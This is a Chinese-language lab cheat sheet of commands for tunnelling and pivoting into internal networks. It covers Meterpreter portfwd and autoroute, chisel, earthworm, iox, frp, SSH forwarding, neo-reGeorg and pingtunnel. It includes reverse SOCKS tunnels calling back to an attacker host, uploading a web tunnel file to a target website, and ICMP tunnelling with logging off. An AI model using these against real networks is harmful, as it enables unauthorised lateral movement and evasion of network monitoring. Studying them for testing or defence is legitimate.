# 内网隧道技术(portfwd,autoroute,chisel,earthworm,iox,frp,ssh,neo-regeorg,pingtunnel,6tunnel)

[TOC]

## 强制代理工具

proxifier

proxychains

------

## portfwd

```
portfwd add -L 192.168.163.131 -l 9090 -r 192.168.163.1 -p 80 

\#正向端口转发 将192.168.163.1:80映射到 192.168.163.131:9090上 -L 默认0.0.0.0

\#可能会导致线路卡住（实验性使用）

portfwd add -R -L 192.168.49.129 -l 1000 -p 111 

\#反向端口转发 中转机器监听自身，自身端口111收到消息，传递到 192.168.49.129:1000

portfwd add -R -L 192.168.11.130 -l 22 -p 111

ssh centos7-2@192.168.49.131 -p 111 

\#中转机监听自身，自身端口111收到消息，传递到192.168.11.130:22端口

这里的-L 可以是kali外网的主机，也可以是中转机内网的主机
```

------

## autoroute

```
run autoroute -s /[mask]  mask default 255.255.255.255.0

run autoroute -p 查看面板

run autoroute -d -s  删除目标proxy

example:

run autoroute -s 192.168.11.1/24

auxiliary/server/socks_proxy

\#将msfconsole的 proxy 实现到本地

proxychains <...>
```

------

## chisel[http]

```
正向端口转发

centos7-1 : ./chisel server -p 12345

kali : chisel.exe client cen_ip:12345 0.0.0.0:11111:127.0.0.1:22222

1 . centos7-1 自身127.0.0.1:22222 开放一个服务只能本地自己访问

2 . centos7-1 架设chisel server 开放端口 12345

3 . kali 架设chisel chilent 连接 cen_ip:12345 将centos7-1 的127.0.0.1:22222 映射到kali的11111端口 

4 . 这里的127.0.0.1:22222 可以替换为centos7-1内网centos7-2 的ip：端口

反向端口转发

kali : ./chisel server -p 12345 --reverse

centos7-1 : ./chisel client kali_ip:12345 R:11111:127.0.0.1:22222

1 . centos7-1 自身127.0.0.1:22222 开放一个服务只能本地自己访问

2 . kali 架设chisel server 开放端口 12345 启用反向连接

3. centos7-1 架设chilent 连接 kali_ip:12345 将centos7-1自身的127.0.0.1:22222 反向映射到kali的11111端口

4 . 这里的127.0.0.1:22222 可以替换为centos7-1内网centos7-2 的ip：端口

socks5正向代理

centos7-1 : ./chisel server -p 12345 --socks5

kali : ./chisel client cen_ip:12345 socks

1 . 通过centos7-1作为跳板机

2 . centos7-1 运行 chisel server 开放端口12345 使用socks5

3 . kali 运行 chisel client client 连接 cen_ip:13245 使用socks启用socks5代理

socks5反向代理

kali : ./chisel server -p 12345 --reverse --socks5

centos7-1 : ./chisel client kali_ip:12345 R:socks

1 . 通过centos7-1作为跳板机

2 . kali 运行 chisel server 开放端口12345 启用反向连接，启用socks5

3 . centos7-1 运行 chisel client 连接 kali_ip:12345 使用socks启用socks5代理
```

------

## earthworm(socks5隧道)

```
ssocksd… >--o -l 正向sock

rssocks… <--o -d -e 反向sock

lcx_listen/rcsocks… >-< -l -e

lcx_slave… <-> -d -e -f -g

proxychains… -->
```

------

## ssh

```
kali: 192.168.10.132

centos7: 192.168.10.147 192.168.11.174

centos7-2: 192.168.11.173

ssh sock代理

ssh -D 8800 centos7@192.168.10.147

\#在kali上通过centos7建立本地8800对centos7的sock代理，流量通过kali本地8800流经centos7前往内网

ssh端口转发

(正向)(kali上执行命令)

kali: ssh -L 12345:127.0.0.1:22 centos7@192.168.10.147

\#通过centos7连接到centos7本地，并将centos7的22端口映射为kali本地端口12345

kali: ssh -L 1234:192.168.11.173:22 centos7@192.168.10.147

\#通过centos7连接到centos7-2，并将centos7-2的22端口映射为kali本地端口1234

(反向)(中转机centos7上执行命令)

centos7: ssh -R 4321:127.0.0.1:22 kali@192.168.10.132

\#在中转机centos7上执行命令将kali的4321端口映射为centos7本地的22端口

centos7: ssh -R 54321:192.168.11.173:22 kali@192.168.10.132

\#在中转机centos7上执行命令将kali的54321端口映射为centos7-2的22端口

ssh跳板连接

ssh -J centos7@192.168.10.147 centos7-2@192.168.11.173 

\#通过centos7的ssh连接到centos7-2的ssh
```

------

## iox

```
优点 多级转发方便 可加密

端口转发

\#监听 0.0.0.0:8888 和0.0.0.0:9999，将两个连接间的流量转发

./iox fwd -l 8888 -l 9999 相当于 ew -s lcx_listen

\#监听0.0.0.0:8888，把流量转发到1.1.1.1:9999

./iox fwd -l 8888 -r 1.1.1.1:9999 相当于ew -s lcx_tran

\#连接1.1.1.1:8888和1.1.1.1:9999, 在两个连接间转发

./iox fwd -r 1.1.1.1:8888 -r 1.1.1.1:9999 相当于ew -s lcx_slave

正向socks5代理

centos7-1 : ./iox proxy -l 12345

\#本地开启socks5代理 开放端口 12345

反向socks5代理

kali : ./iox proxy -l 2345 -l 2346 #此处2345是远程回连端 2346是本地入口

centos7-1 : ./iox proxy -r kali_ip:2345

加密 : kali 仅开始输出端不能加密，输入端可加密

二层正向socks5代理

kali : ./iox fwd -l 2345 -l *2346 -k 123456

centos7-1 : ./iox fwd -r *kali_ip:2346 -r *centos7-2_ip:12345 -k 123456 

centos7-2 : ./iox proxy -l *12345 123456

\#kali 开启 本地端口转发 将 2345 监听到的信息转发到 2346

\#centos7-1 开启端口转发 连接 kali_ip:2346 和 centos7-2_ip:12345

\#centos7-2 开启本地socks5 代理 监听本地端口 12345

二层反向socks5代理

kali : ./iox proxy -l *2346 -l 2345 -k 123456

centos7-1 : ./iox fwd -l *5678 -r *kali_ip:2346 -k 123456

centos7-2 : ./iox proxy -r *centos7-1_ip:5678 123456

kali 开启本地socks5转发

centos 7-1 开启端口转发 监听 5678 转发到 kali_ip:2346

centos 7-2 开启反向socks5 连接centos7-1的 5678端口
```

------

## frp

```
弊端：增加了一个文件 frpc.toml 

socks5代理

kali : ./frps -p 8888

centos7-1 : frpc -c frpc.toml

frpc.toml

""""""""""""""""""""

serverAddr = "192.168.12.130"

serverPort = 8888

[[proxies]]

name = "test1"

type = "tcp"

remotePort = 6000

[proxies.plugin]

type = "socks5"

""""""""""""""""""""

kali 本地建立frps 服务器，监听本地端口8888

centos7-1 连接kali_ip kali_port 开启socks5 并映射使用kali本地6000通信
```

------

## neo-regeorg(http隧道)

```
python neoreg.py generate -k passwd 生成带密码的一系列tunnel文件

将文件上传至靶机网站目录

python neoreg.py -u http://..../tunnel.php -p 9999 -k passwd #开启socks5服务开放本地端口9999连接远程web服务器

将本地proxychains文件修改为127.0.0.1 9999
```

------

## pingtunnel(icmp隧道)  #需要root权限

```
pingtunnel(仅仅linux可以使用,且为root权限,windows测试使用失败)

socks5代理

centos7: ./pingtunnel -type server -noprint 1 -nolog 1

kali: ./pingtunnel -type client -l 0.0.0.0:1080 -s 192.168.10.147 -sock5 1 -noprint 1

端口转发

centos7-1 : ./pingtunnel -type server -noprint 1 -nolog 1

kali : ./pingtunnel -type client -l 0.0.0.0:1234 -s 192.168.12.131 -t 192.168.11.133:8000 -tcp 1 -noprint 1 -nolog 1  #端口转发 
```

------

## 6tunnel

```
6tunnel -4 7777 fe80::5b33:115b:ce91:1d37%eth0 22

\#建立端口转发,将fe80::5b33:115b:ce91:1d37的22端口映射到kali本地7777端口，使用ipv6通信
```



------

idoine dns隧道